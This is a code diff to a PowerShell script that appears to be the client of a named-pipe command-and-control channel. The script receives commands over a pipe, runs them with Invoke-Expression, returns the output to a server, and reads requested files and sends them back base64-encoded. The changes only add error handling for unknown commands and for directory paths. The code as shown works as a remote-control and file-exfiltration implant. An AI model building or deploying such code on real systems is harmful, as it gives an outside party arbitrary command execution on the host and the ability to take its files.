@@ -123,11 +123,19 @@ while($pipeClient.IsConnected){
         }
         else{
             Write-Host "Sending output of",$command,"to server..."
-            $result = Invoke-Expression -Command $command
-            $sw.WriteLine($result.Length) # Sending lenght of the command result to Server
-            for($cpt = 0; $cpt -lt $result.Length; $cpt++){
-                $sw.WriteLine($result[$cpt])
+            try{
+                $result = Invoke-Expression -Command $command
+                $sw.WriteLine($result.Length) # Sending lenght of the command result to Server
+                for($cpt = 0; $cpt -lt $result.Length; $cpt++){
+                    $sw.WriteLine($result[$cpt])
+                }
             }
+            catch [System.Management.Automation.CommandNotFoundException]{
+                $length = 1
+                $sw.WriteLine($length)
+                $sw.WriteLine("Command Not Found")
+            }
+
         }
     }
 
@@ -140,17 +148,23 @@ while($pipeClient.IsConnected){
         }
 
         else{
-            try{
-                Write-Host "Copying file to host"
-                $filebytes = [System.IO.File]::ReadAllBytes($filepath)
-                $fileB64 = [System.Convert]::ToBase64String($filebytes)
-                Write-Host $filebytes
-                $sw.WriteLine($fileB64)  
+
+            if(Test-Path -Path $filepath -PathType Container){
+                $sw.WriteLine("Please specify a file...")
             }
-            catch [System.IO.FileNotFoundException]{
-                Write-Host "File Not Found...Stop copying"
-                $sw.WriteLine("File Not Found...")
-            }                    
+            else{
+                try{
+                    Write-Host "Copying file to host"
+                    $filebytes = [System.IO.File]::ReadAllBytes($filepath)
+                    $fileB64 = [System.Convert]::ToBase64String($filebytes)
+                    Write-Host $filebytes
+                    $sw.WriteLine($fileB64)  
+                }
+                catch [System.IO.FileNotFoundException]{
+                    Write-Host "File Not Found...Stop copying"
+                    $sw.WriteLine("File Not Found...")
+                }              
+            }              
         }
     }
 
